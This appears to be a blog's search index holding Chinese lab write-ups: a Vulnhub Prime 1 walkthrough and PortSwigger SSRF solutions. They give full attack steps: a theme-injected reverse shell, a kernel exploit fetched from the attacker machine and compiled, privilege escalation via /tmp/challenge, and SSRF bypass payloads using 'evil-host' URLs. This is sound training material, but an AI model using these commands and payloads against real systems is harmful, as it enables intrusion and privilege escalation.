<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Vulnhub_Prime1</title>
      <link href="/2024/04/22/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/prime_1/"/>
      <url>/2024/04/22/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/prime_1/</url>
      
        <content type="html"><![CDATA[<h1 align ="center">Prime 1</h1><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="1-namp扫描"><a href="#1-namp扫描" class="headerlink" title="1.namp扫描"></a>1.namp扫描</h2><h3 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.144.0/24</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160029112.png" alt="image-20240416002900036"></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -min-rate 10000 -p- 192.168.144.131</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现开放了22和80端口</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160029493.png" alt="image-20240416002935434"></p><h3 id="TCP-UDP扫描"><a href="#TCP-UDP扫描" class="headerlink" title="TCP,UDP扫描"></a>TCP,UDP扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sV -O -p22,80 192.168.144.131</span><br><span class="line">-sV 对端口上的服务程序版本进行扫描</span><br><span class="line">-O 对目标主机的操作系统进行扫描</span><br><span class="line">-sT TCP连接扫描</span><br><span class="line"></span><br><span class="line">sudo nmap -sU -p22,80 192.168.144.131</span><br><span class="line">-sU 对UDP进行扫描</span><br></pre></td></tr></table></figure><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160036713.png" alt="image-20240416003619656" style="zoom:50%;" /><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160036094.png" alt="image-20240416003627060" style="zoom:50%;" /><h3 id="脚本漏洞扫描，为我们渗透提供初步思路"><a href="#脚本漏洞扫描，为我们渗透提供初步思路" class="headerlink" title="脚本漏洞扫描，为我们渗透提供初步思路"></a>脚本漏洞扫描，为我们渗透提供初步思路</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --script=vuln -p22,80 192.168.144.131</span><br></pre></td></tr></table></figure><p>得到了一个cve以及一个wordpress网站的登陆页</p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160046864.png" alt="image-20240416004617795" style="zoom:50%;" /><h1 id="WEB端攻击"><a href="#WEB端攻击" class="headerlink" title="WEB端攻击"></a>WEB端攻击</h1><ul><li>访问80端口并没有什么有用信息，于是进行FUZZ</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.144.131 -o DirbReport.txt</span><br></pre></td></tr></table></figure><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160100528.png" alt="image-20240416010024433" style="zoom:50%;" /><ul><li>查看dev文件</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.144.131/dev</span><br></pre></td></tr></table></figure><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160101883.png" alt="image-20240416010151831" style="zoom:50%;" /><ul><li>限定扩展名，特定搜索,因为很多有信息的文件可能是txt,html,ph 或者zip</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dirb http://192.168.144.131 -X .txt,.php,.html</span><br></pre></td></tr></table></figure><p>发现了secret文件</p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160104483.png" alt="image-20240416010420435" style="zoom:50%;" /><p>访问secret文件，其中比较重要的是<code>https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web看到location.txt，你就会得到你的下一步行动</code></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160105237.png" alt="image-20240416010513194"></p><ul><li>接着使用提示到得wfuzz工具对PHP文件进行FUZZ</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 --hh 136 http://192.168.144.131/index.php?FUZZ=</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161145749.png" alt="image-20240416114558671"></p><ul><li>找到参数file，但我们并没有找到location.txt文件，所有我们可以尝试文件包含location.txt文件</li></ul><p>回显是<code>在其他一些 php 页面上使用“secrettier360”参数以获得更多乐趣</code></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161147416.png" alt="image-20240416114753356"></p><ul><li>在image.php页面上访问参数&#96;&#96;secrettier360&#96;</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161151671.png" alt="image-20240416115151626"></p><ul><li>到这一步知道了参数可以尝试使用文件包含</li></ul><p>其中知道了1.victor用户用于bash  2.saket在他的目录下可以发现password文件</p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161156830.png" alt="image-20240416115611754" style="zoom:50%;" /><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161157302.png" alt="image-20240416115749270"></p><ul><li>既然知道了saket的路劲直接访问读取密码—follow_the_ippsec</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161204110.png" alt="image-20240416120412058"></p><ul><li>尝试使用账号密码登录ssh以及WordPress后台</li></ul><p>ssh登录失败</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161211057.png" alt="image-20240416121123006"></p><p>使用saket用户后台登录失败，但是使用victor用户成功</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161213786.png" alt="image-20240416121344723"></p><img src="C:\Users\But\AppData\Roaming\Typora\typora-user-images\image-20240416135416751.png" alt="image-20240416135416751" style="zoom: 50%;" /><ul><li>接着在后台的wordpress寻找突破口，尝试上传文件，找一个个功能点以及接口，看看有没有文件上传或者可写的地方</li></ul><p>写入一句话反弹shell，刷新使用主题的路径<code>http://192.168.144.131/wordpress/wp-content/themes/twentynineteen/secret.php</code>触犯一句话</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161407101.png" alt="image-20240416140711025"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161410871.png" alt="image-20240416141013834"></p><h2 id="主机提权-解法一内核提权"><a href="#主机提权-解法一内核提权" class="headerlink" title="主机提权(解法一内核提权)"></a>主机提权(解法一内核提权)</h2><ul><li>查看主机权限,信息收集</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">whoami</span><br><span class="line">uname -a uname命令：主要用于输出一组操作系统的信息</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161415174.png" alt="image-20240416141520074"></p><ul><li>内核版本比较低,查看看看有没有漏洞提权使用searchsploit工具</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Linux ubuntu 4.10.0-28</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161418437.png" alt="image-20240416141829398"></p><ul><li>利用历史漏洞尝试提权</li></ul><p>利用第二个方法提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Linux ubuntu -m 45010</span><br></pre></td></tr></table></figure><p>这个文件是一个C语言编写的文件需要C语言编译</p><p><em>注意:由于不同环境gcc编译后的文件是不同的，这里我们应该把45010.c上传到靶机环境中再在靶机中进行编译。如果靶机中没有gcc，那再考虑搭建靶机环境，或者本地编译再上传</em></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161432274.png" alt="image-20240416143258222"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161434413.png" alt="image-20240416143405314"></p><p>本地起一个http服务,让目标机器wegt这个.c文件然后再编译(先上传到服务器再编译)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0:80</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161437219.png" alt="image-20240416143723153"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.144.132/45010.c</span><br></pre></td></tr></table></figure><p>发现当前目录是没有写入的权限的</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161443460.png" alt="image-20240416144319419"></p><p>查看哪个目录有写入权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -lish</span><br></pre></td></tr></table></figure><p>发现tmp文件夹有写入权限</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161446193.png" alt="image-20240416144643110"></p><p>进入tmp目录再wget下来.c文件然后编译</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161450169.png" alt="image-20240416145003118"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.尝试编译</span><br><span class="line"> </span><br><span class="line">gcc 45010.c -o getRoot</span><br><span class="line"> </span><br><span class="line">2.添加执行权限</span><br><span class="line"> </span><br><span class="line">chmod +x getRoot</span><br><span class="line"> </span><br><span class="line">3.运行</span><br><span class="line"></span><br><span class="line">./getRoot </span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161501742.png" alt="image-20240416150113680"></p><p>提权成功，但表示完整的交互，看看是否有python,并且使用python完善交互环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l 看看有什么软件包</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161503163.png" alt="image-20240416150356069"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161507438.png" alt="image-20240416150754392"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161506045.png" alt="image-20240416150647011"></p><p>靶机基本拿下了</p><h2 id="主机提权（方法二OpenSSL解密）"><a href="#主机提权（方法二OpenSSL解密）" class="headerlink" title="主机提权（方法二OpenSSL解密）"></a>主机提权（方法二OpenSSL解密）</h2><blockquote><p>sudo -l 查看当前用户有哪些权限，发现当前用户能不用root 密码运行<a href="https://so.csdn.net/so/search?q=enc&spm=1001.2101.3001.7020">enc</a>文件，看见enc文件猜测存在openssl加密</p></blockquote><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161928423.png" alt="image-20240416192816338"></p><h3 id="ENC探索和查找"><a href="#ENC探索和查找" class="headerlink" title="ENC探索和查找"></a>ENC探索和查找</h3><p>发现是一个可执行文件,但是密码目前不知道</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161931868.png" alt="image-20240416193151819"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161933917.png" alt="image-20240416193337861"></p><ul><li>查找密码,查找备份文件</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;*backup*&quot;</span><br><span class="line">find / -name “*passwd*”</span><br><span class="line">find / -name “*password*”</span><br><span class="line">find / -name &quot;*backup*&quot;  2&gt;/dev/null</span><br><span class="line">find / -name &quot;*backup*&quot;  2&gt;/dev/null | sort | less</span><br><span class="line">(有很多信息，其中大部分都是Permission denied 这是报错Permission denied（权限不允许），这种信息是没意义的，干脆把他丢弃掉，用2&gt;/dev/null过滤：)</span><br></pre></td></tr></table></figure><p>会返回很多信息其中找到几个比较有价值的,排除掉再help目录或者modlues目录下面的.例如&#x2F;opt&#x2F;backup,&#x2F;opt&#x2F;back&#x2F;server_database&#x2F;backup_pass等等</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161940373.png" alt="image-20240416194013265"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161940182.png" alt="image-20240416194052097"></p><p>查看这几个可疑文件,找到关键信息</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161943365.png" alt="image-20240416194349317"></p><p>运行enc文件之后得到了几个新的东西</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161947164.png" alt="image-20240416194706103"></p><ul><li>enc破解利用</li></ul><p>得到一个密文和一个密钥,其中根据提示我们可以知道md5的密钥</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161948613.png" alt="image-20240416194855549"></p><ul><li>加密MD5</li></ul><p>接下来md5加密得到密钥,这里一个小细节就是MD5加密的时候要使用-n参数,因为在终端用echo输出会再后面加一个&#x2F;n字符,我们需要去掉.awk是对字符串进行处理的一个工具，<code>awk -F &#39; &#39; &#39;&#123;print $1;&#125;&#39;</code>意思是以空格为分割，打印其中第一个部分，这样就会只输出366a74cb3c959de17d61db30591c39d1 后面的‘-’不会输出 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n &#x27;ippsec&#x27; | md5sum | awk -F &#x27; &#x27; &#x27;&#123;print $1;&#125;&#x27;</span><br></pre></td></tr></table></figure><ul><li>openssl破解</li></ul><p>openssl enc的使用,现在需要密文,密钥,加解密方式,加解密方式是不知道的.我们只是大概知道可能是base64加密,另外-k参数输入密钥需要16进制的形式</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162020058.png" alt="image-20240416201722016"></p><p>先处理k参数输入16进制的参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -n &quot;ippsec&quot; | md5sum | awk -F &#x27; &#x27; &#x27;&#123;print $1;&#125;&#x27; | od -A n -t x1(这个命令会存在后面带一个oa)</span><br><span class="line">使用tr –d  ‘\n’去掉换行符 </span><br><span class="line">echo -n &quot;ippsec&quot; | md5sum | awk -F &#x27; &#x27; &#x27;&#123;print $1;&#125;&#x27; |tr -d &#x27;\n&#x27;| od -A n -t x1 | tr -d  &#x27; &#x27; | tr -d  &#x27;\n&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162043244.png" alt="image-20240416204305186"></p><p>处理解密方式,因为有很多解密的方式我们需要遍历,利用bash命令实现对其的遍历</p><p>首先是把所有的方法都保存在CipherTypeRaw文件里面</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &#x27;&#123;gsub(/ /,&quot;\n&quot;);print&#125;&#x27; CipherTypeRaw | sort | uniq &gt; CipherTypes</span><br><span class="line">加上sort是让每一行变得紧密,uniq每行的重复字符删去(删除多余的换行)</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162108053.png" alt="image-20240416210839976"></p><p>使用bash命令遍历</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for cipher in $(cat CipherTypes);do echo &quot;nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=&quot; | openssl enc -d -a -$cipher -K 3336366137346362336339353964653137643631646233303539316333396431 2&gt;/dev/null;echo $cipher;done</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到的是aes-256-ecb加密,密码是”tribute_to_ippsec”,还有一个Victor的落款</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162127587.png" alt="image-20240416212735508"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162128353.png" alt="image-20240416212855286"></p><ul><li>ssh连接提权</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162137965.png" alt="image-20240416213716870"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162138882.png" alt="image-20240416213826831"></p><p>按照提示运行相关文件,发现缺少challenge,按照提示来</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162139357.png" alt="image-20240416213905304"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162143044.png" alt="image-20240416214315930"></p><p>以root运行&#x2F;home&#x2F;victor&#x2F;undefeated_victor会去运行&#x2F;tmp&#x2F;challenge，如果challenge中包含提权的指令，那么一旦运行就可以提权了，没有这个challenge文件，那咱就创建一个，tmp文件也可以写入文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;#!/bin/bash&#x27; &gt; challenge</span><br><span class="line">echo &#x27;/bin/bash&#x27; &gt;&gt; challenge </span><br><span class="line">chmod +x challenge </span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162147499.png" alt="image-20240416214704448"></p><p>提权成功!</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>前期先信息收集,这个靶机重点是在于信息挖掘,对于目录的fuzz,接着是对于wordpress后台的getshell,然后方法一通过内核版本过低进行提权,方法二是获取openssl的账号密码进行提权.重点是2.openssl解密：1密文；2密钥；3加密算法 缺一不可4.awk,md5sum,od,tr等字符串处理命令4.bash脚本</p>]]></content>
      
      
      <categories>
          
          <category> 靶场-Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>portswigger_ssrf</title>
      <link href="/2024/02/02/%E9%9D%B6%E5%9C%BA/portswigger/SSRF/"/>
      <url>/2024/02/02/%E9%9D%B6%E5%9C%BA/portswigger/SSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="Basic-SSRF-against-the-local-server"><a href="#Basic-SSRF-against-the-local-server" class="headerlink" title="Basic SSRF against the local server"></a>Basic SSRF against the local server</h1><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><ul><li>抓到存在url的包，尝试ssrf</li></ul><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021549509.png" alt="image-20240202154937413" style="zoom:50%;" /><ul><li>替换url</li></ul><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021550518.png" alt="image-20240202155025432" style="zoom:50%;" /><ul><li>拼接合适的删除url<code>stockApi=http://localhost/admin/delete?username=carlos</code>,解决</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021551100.png" alt="image-20240202155139030"></p><h1 id="Basic-SSRF-against-another-back-end-system（针对另一个后端系统的基本SSRF）"><a href="#Basic-SSRF-against-another-back-end-system（针对另一个后端系统的基本SSRF）" class="headerlink" title="Basic SSRF against another back-end system（针对另一个后端系统的基本SSRF）"></a>Basic <a href="https://portswigger.net/web-security/ssrf">SSRF</a> against another back-end system（针对另一个后端系统的基本SSRF）</h1><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><ul><li>抓包看到有一个内网地址，192.168.0.1</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021607697.png"></p><ul><li>在后面拼接admin返回错误</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021608978.png" alt="image-20240202160815904"></p><ul><li>遍历198.168.0.1-255找到另外一个内网地址</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021613760.png" alt="image-20240202161344681"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021614733.png" alt="image-20240202161400650"></p><ul><li>找到内网地址加入参数<code>stockApi=http://192.168.0.89:8080/admin/delete?username=carlos</code></li></ul><h1 id="SSRF-with-blacklist-based-input-filter-具有基于黑名单的输入过滤器的SSRF"><a href="#SSRF-with-blacklist-based-input-filter-具有基于黑名单的输入过滤器的SSRF" class="headerlink" title="SSRF with blacklist-based input filter(具有基于黑名单的输入过滤器的SSRF)"></a>SSRF with blacklist-based input filter(具有基于黑名单的输入过滤器的SSRF)</h1><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><ul><li>使用<code>127.0.0.1</code>的替代IP表示，例如<code>2130706433</code>、<code>017700000001</code>或<code>127.1</code>（十进制，八进制表示）</li><li>注册您自己的域名，解析为<code>127.0.0.1</code></li><li>使用URL编码或大小写变化混淆被阻止的字符串</li><li>提供您控制的URL，该URL重定向到目标URL。尝试使用不同的重定向代码，以及目标URL的不同协议。例如，在重定向期间从<code>http:</code>切换到<code>https:</code> URL已经被证明可以绕过一些反SSRF过滤器。</li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li><p>抓包用url双编码绕过<code>stockApi=http://127.1/%2561dmin</code>把字母a两次url编码</p></li><li><p>删除的url<code>stockApi=http://127.1/%2561dmin/delete?username=carlos</code></p></li></ul><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021642896.png" alt="image-20240202164202819" style="zoom:50%;" /><h1 id="SSRF-with-whitelist-based-input-filter（具有基于白名单的输入过滤器的SSRF）"><a href="#SSRF-with-whitelist-based-input-filter（具有基于白名单的输入过滤器的SSRF）" class="headerlink" title="SSRF with whitelist-based input filter（具有基于白名单的输入过滤器的SSRF）"></a>SSRF with whitelist-based input filter（具有基于白名单的输入过滤器的SSRF）</h1><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><ul><li><p>您可以使用<code>#</code>字符来表示URL片段。举例来说：<code>https://evil-host#expected-host</code></p></li><li><p>您可以使用<code>@</code>字符在URL中的主机名之前嵌入凭据。举例来说：<code>https://expected-host:fakepassword@evil-host</code></p></li><li><p>您可以利用DNS命名层次结构将所需的输入放入您控制的完全限定的DNS名称中。举例来说：<code>https://expected-host.evil-host</code></p></li><li><p>多种绕过方式结合：<code>https://evil-host%2523@expected-host</code>（其中的%2523是表示#，就是evil-host#@expected-host）</p></li></ul><h2 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h2><ul><li><p>抓包试试@能不能绕过</p></li><li><p>原本是<code>http://stock.weliketoshop.net:8080/product/stock/check?productId=1%26storeId=1</code>插入@字符<code>http://11212@stock.weliketoshop.net:8080/product/stock/check?productId=1%26storeId=1</code>发现@可用,就是url支持嵌入式凭据</p></li></ul><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021719044.png" alt="image-20240202171923992" style="zoom:50%;" /><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021705606.png" style="zoom:50%;" /><ul><li>再尝试#,发现报错,进行双编码绕过,再尝试前面嵌入127.1<code>stockApi=http://127.1%25%32%33@stock.weliketoshop.net/admin</code></li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021722032.png" alt="image-20240202172224949"></p><h1 id="SSRF-with-filter-bypass-via-open-redirection-vulnerability-SSRF通过开放重定向漏洞实现过滤器旁路"><a href="#SSRF-with-filter-bypass-via-open-redirection-vulnerability-SSRF通过开放重定向漏洞实现过滤器旁路" class="headerlink" title="SSRF with filter bypass via open redirection vulnerability(SSRF通过开放重定向漏洞实现过滤器旁路)"></a>SSRF with filter bypass via open redirection vulnerability(SSRF通过开放重定向漏洞实现过滤器旁路)</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><ul><li>在前面的例子中，假设用户提交的URL经过严格验证，以防止SSRF行为的恶意利用。但是，允许其URL的应用程序包含一个开放的重定向漏洞。如果用于生成后端HTTP请求的API支持重定向，则可以构造一个满足过滤器的URL，并将请求重定向到所需的后端目标.也就是说利用重定向访问从而实现ssrf</li><li>例子<code>stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin</code>这个会跳转到访问<code>http://192.168.0.68/admin</code></li><li>这个SSRF漏洞是有效的，因为应用程序首先验证提供的<code>stockAPI</code> URL是否在允许的域中，它确实是。然后，应用程序请求提供的URL，这将触发开放重定向。它遵循重定向，并向攻击者选择的内部URL发出请求。</li></ul><h2 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h2><ul><li>抓包找到一个有重定向的请求包</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021731275.png"></p><ul><li><p>观察这个请求包,我们看到存在一个<code>/product/nextProduct</code>接口,我们把<code>path</code>的地址换成<code>http://192.168.0.12:8080/admin</code>发现是无法访问的,但是我们可将两个点结合</p></li><li><p>先测试一下这个接口是否有重定向的漏洞,看到dnslog带出了</p></li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021742642.png"></p><ul><li>接着我们在访问价格的请求包中的<code>stockApi</code>拼接这个接口并且访问内网地址<code>stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin</code></li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021743155.png" alt="22"></p><ul><li>访问<code>stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos</code>删除用户</li></ul><h1 id="Blind-SSRF-with-out-of-band-detection-具有带外检测的盲SSRF"><a href="#Blind-SSRF-with-out-of-band-detection-具有带外检测的盲SSRF" class="headerlink" title="Blind SSRF with out-of-band detection(具有带外检测的盲SSRF)"></a>Blind SSRF with out-of-band detection(具有带外检测的盲SSRF)</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><ul><li>使用带外技术最简单、最有效的方法是使用<a href="https://portswigger.net/burp/documentation/collaborator">Burp Collaborator</a>。您可以使用<a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator">Burp Collaborator</a>来生成唯一的域名，将其作为有效负载发送到应用程序，并监视与这些域的任何交互。如果观察到来自应用程序的传入HTTP请求，则它易受SSRF攻击。</li></ul><h2 id="WP-2"><a href="#WP-2" class="headerlink" title="WP"></a>WP</h2><ul><li>抓包更改请求头referer参数</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021751446.png"></p><ul><li>带出http访问</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021756146.png" alt="image-20240202175657090"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场-portswigger </category>
          
      </categories>
      
      
        <tags>
            
            <tag> portswigger </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Postmessage学习</title>
